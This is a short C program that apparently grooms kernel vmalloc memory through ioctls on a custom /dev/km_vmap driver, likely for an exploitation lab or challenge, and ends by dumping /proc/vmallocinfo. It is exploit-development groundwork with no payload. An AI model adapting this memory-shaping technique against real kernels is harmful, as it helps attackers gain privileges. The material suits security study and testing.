#include <fcntl.h>
#include <stdio.h>
#include <assert.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/queue.h>
#include <sys/ioctl.h>

#include "km_vmap.h"

#define PAGE_SHIFT 12
#define MAX_ALLOC 0x1000

void km_vmap_unmap(int fd, struct km_vmap_user_map *map) {
    int status;
    assert(map->addr != 0);
    status = ioctl(fd, KM_VMAP_IOCTL_UNMAP, map);
    if (status) {
        perror("[-] FATAL: failed to unmap");
        exit(1);
    }
    memset(map, 0, sizeof(*map));
}

void km_vmap_map(int fd, struct km_vmap_user_map *out, size_t size) {
    int status;
    out->addr = 0;
    out->npages = size >> PAGE_SHIFT;
    status = ioctl(fd, KM_VMAP_IOCTL_MAP, out);
    if (status) {
        printf("[-] FATAL: failed to map: size=%lx\n", size);
        exit(1);
    }
}

void km_vmap_fork(int fd, struct km_vmap_user_fork *out) {
    int status = ioctl(fd, KM_VMAP_IOCTL_FORK, out);
    if (status) {
        printf("[-] FATAL: failed to fork\n");
        exit(1);
    }
}

void km_vmap_unfork(int fd, struct km_vmap_user_fork *req) {
    int status = ioctl(fd, KM_VMAP_IOCTL_UNFORK, req);
    if (status) {
        printf("[-] FATAL: failed to unfork: stack=%zx, scs=%zx\n", req->stack, req->scs);
        exit(1);
    }

    memset(req, 0, sizeof(*req));
}

size_t trigger_purge(int fd, struct km_vmap_user_map *maps) {
    int i;
    for (i = 0; i < 128; i++) {
        km_vmap_map(fd, &maps[i], 0x100000);
    }
    for (i = 0; i < 128; i++) {
        km_vmap_unmap(fd, &maps[i]);
    }
}

int main() {
    int i;
    int fd;
    int status;
    struct km_vmap_user_map *maps;
    struct km_vmap_user_fork *procs;
    struct km_vmap_user_map *mapsoff;

    if ((fd = open("/dev/km_vmap", O_RDWR)) == -1) {
        perror("Failed to open the file");
        return 1;
    }

    maps = calloc(MAX_ALLOC, sizeof(*maps));
    mapsoff = maps;
    assert(maps != NULL);

    procs = calloc(MAX_ALLOC, sizeof(*procs));
    assert(procs != NULL);

    trigger_purge(fd, maps);

    for (i = 0; i < 0x30; i++) {
        km_vmap_map(fd, mapsoff++, 0x3000);
        km_vmap_map(fd, mapsoff++, 0x1000);
    }

    for (i = 0; i < 0x60; i += 2) {
        km_vmap_unmap(fd, &maps[i]);
    }

    trigger_purge(fd, maps);

    for (i = 0; i < 0x30; i++) {
        km_vmap_fork(fd, &procs[i]);
    }

    for (i = 0; i < 0x30; i++) {
        km_vmap_unfork(fd, &procs[i]);
    }

    trigger_purge(fd, maps);

    for (i = 0; i < 0x20; i++) {
        km_vmap_map(fd, mapsoff++, 0x4000);
    }

    for (i = 0; i < 0x30; i++) {
        km_vmap_fork(fd, &procs[i]);
    }

    system("cat /proc/vmallocinfo");

    return 0;
}
